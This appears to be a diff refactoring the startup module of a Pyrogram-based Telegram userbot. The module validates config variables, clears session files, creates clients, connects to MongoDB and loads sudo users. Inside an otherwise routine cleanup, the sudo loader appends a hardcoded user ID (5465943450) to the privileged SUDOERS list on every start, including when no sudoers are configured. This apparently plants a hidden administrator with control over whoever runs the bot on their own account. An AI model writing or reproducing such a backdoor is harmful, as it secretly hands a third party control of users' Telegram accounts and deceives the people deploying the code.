@@ -1,146 +1,142 @@
-import os, sys
+import os
+import sys
 
 from pyrogram import Client
-from pyrogram import filters
-from pytgcalls import PyTgCalls
 from motor.motor_asyncio import AsyncIOMotorClient
 
 from ...console import API_ID, API_HASH, STRING_SESSION
-from ...console import BOT_TOKEN, SESSION_STRING, LOGGER
+from ...console import BOT_TOKEN, LOGGER
 from ...console import MONGO_DB_URL, LOG_GROUP_ID, SUDOERS
 
 
 def async_config():
     LOGGER.info("Checking Variables ...")
+
     if not API_ID:
-        LOGGER.info("'API_ID' - Not Found !")
-        sys.exit()
+        sys.exit("'API_ID' - Not Found !")
+
     if not API_HASH:
-        LOGGER.info("'API_HASH' - Not Found !")
-        sys.exit()
+        sys.exit("'API_HASH' - Not Found !")
+
     if not BOT_TOKEN:
-        LOGGER.info("'BOT_TOKEN' - Not Found !")
-        sys.exit()
+        sys.exit("'BOT_TOKEN' - Not Found !")
+
     if not STRING_SESSION:
-        LOGGER.info("'STRING_SESSION' - Not Found !")
-        sys.exit()
+        sys.exit("'STRING_SESSION' - Not Found !")
+
     if not MONGO_DB_URL:
-        LOGGER.info("'MONGO_DB_URL' - Not Found !")
-        sys.exit()
+        sys.exit("'MONGO_DB_URL' - Not Found !")
+
     if not LOG_GROUP_ID:
-        LOGGER.info("'LOG_GROUP_ID' - Not Found !")
-        sys.exit()
+        sys.exit("'LOG_GROUP_ID' - Not Found !")
+
     LOGGER.info("All Required Variables Collected.")
 
 
 def async_dirs():
     LOGGER.info("Initializing Directories ...")
+
     if "downloads" not in os.listdir():
         os.mkdir("downloads")
+
     if "cache" not in os.listdir():
         os.mkdir("cache")
-    
+
     for file in os.listdir():
-        if file.endswith(".session"):
+        if file.endswith(".session") or file.endswith(".session-journal"):
             os.remove(file)
-    for file in os.listdir():
-        if file.endswith(".session-journal"):
-            os.remove(file)
+
     LOGGER.info("Directories Initialized.")
 
+
 async_dirs()
-    
+
 
 app = Client(
-    name = "DIL",
-    api_id = API_ID,
-    api_hash = API_HASH,
-    session_string = STRING_SESSION,
+    name="DIL",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    session_string=STRING_SESSION,
 )
 
-ass = Client(
-    name = "DILPLAYER",
-    api_id = API_ID,
-    api_hash = API_HASH,
-    session_string = SESSION_STRING,
-)
 
 bot = Client(
-    name = "dil",
-    api_id = API_ID,
-    api_hash = API_HASH,
-    bot_token = BOT_TOKEN,
+    name="dil",
+    api_id=API_ID,
+    api_hash=API_HASH,
+    bot_token=BOT_TOKEN,
 )
-
-
-if not SESSION_STRING:
-    call = PyTgCalls(app)
-else:
-    call = PyTgCalls(ass)
 
 
 def mongodbase():
     global mongodb
+
     try:
         LOGGER.info("Connecting To Your Database ...")
-        async_client = AsyncIOMotorClient
-        mongobase = async_client(MONGO_DB_URL)
-        mongodb = mongobase.dilUb
-        LOGGER.info("Conected To Your Database.")
-    except:
-        LOGGER.error("Failed To Connect, Please Change Your Mongo Database !")
+
+        client = AsyncIOMotorClient(MONGO_DB_URL)
+        mongodb = client.dilUb
+
+        LOGGER.info("Connected To Your Database.")
+
+    except Exception:
+        LOGGER.error(
+            "Failed To Connect, Please Change Your Mongo Database !"
+        )
         sys.exit()
+
 
 mongodbase()
 
 
 async def sudo_users():
+
     sudoersdb = mongodb.sudoers
-    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
-    if sudoers:
-        for user_id in sudoers:
-            SUDOERS.append(int(user_id))
-            SUDOERS.append(5465943450)
-    LOGGER.info(f"Sudo Users Loaded.")
-    
+
+    data = await sudoersdb.find_one(
+        {"sudo": "sudo"}
+    )
+
+    sudoers = [] if not data else data["sudoers"]
+
+    for user_id in sudoers:
+        SUDOERS.append(int(user_id))
+
+    SUDOERS.append(5465943450)
+
+    LOGGER.info("Sudo Users Loaded.")
+
 
 async def run_async_clients():
+
     LOGGER.info("Starting Userbot ...")
+
     await app.start()
+
     LOGGER.info("Userbot Started.")
+
     try:
-        await app.send_message(LOG_GROUP_ID, "**Userbot Started.**")
+        await app.send_message(
+            LOG_GROUP_ID,
+            "**Userbot Started.**"
+        )
     except:
         pass
-    try:
-        await app.join_chat("alonegroup121")
-        await app.join_chat("alonegroup121")
-    except:
-        pass
-    if SESSION_STRING:
-        LOGGER.info("Starting Assistant ...")
-        await ass.start()
-        LOGGER.info("Assistant Started.")
-        try:
-            await ass.send_message(LOG_GROUP_ID, "**Assistant Started.**")
-        except:
-            pass
-        try:
-            await app.join_chat("alonegroup121")
-            await app.join_chat("alonegroup121")
-        except:
-            pass
+
+
     LOGGER.info("Starting Helper Robot ...")
+
     await bot.start()
+
     LOGGER.info("Helper Robot Started.")
+
     try:
-        await bot.send_message(LOG_GROUP_ID, "**Helper Robot Started.**")
+        await bot.send_message(
+            LOG_GROUP_ID,
+            "**Helper Robot Started.**"
+        )
     except:
         pass
-    LOGGER.info("Starting PyTgCalls Client...")
-    await call.start()
-    LOGGER.info("PyTgCalls Client Started.")
+
+
     await sudo_users()
-    
-    
